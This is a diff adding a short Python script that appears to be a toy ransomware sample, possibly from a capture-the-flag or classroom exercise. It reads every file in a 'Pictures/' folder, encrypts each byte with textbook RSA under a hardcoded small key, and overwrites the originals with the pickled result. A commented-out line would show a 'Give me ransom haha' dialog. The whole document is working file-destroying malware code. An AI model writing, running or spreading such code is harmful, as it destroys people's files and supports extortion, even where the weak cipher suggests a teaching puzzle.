@@ -1,0 +1,27 @@
+#!/usr/bin/env python3
+import sys
+import os
+import pickle
+
+Usage = f'''
+python3 {__file__} <n> <e> <file>
+'''
+#n = int(sys.argv[1])
+n = 22291846172619859445381409012451
+#e = int(sys.argv[2])
+e = 65535
+#filename = sys.argv[3]
+#filename = sys.argv[1]
+path = 'Pictures/'
+files = os.listdir(path)
+
+for f in files:
+    filename = 'Pictures/'+f
+    plain_bytes = b''
+    with open(filename, 'rb') as f:
+        plain_bytes = f.read()
+    cipher_int = [pow(i, e, n) for i in plain_bytes]
+    with open(filename, 'wb') as f:
+        pickle.dump(cipher_int, f)
+#os.system('zenity --error --text="Give me ransom haha" --title="Error" --ok-label "QQ"')
+
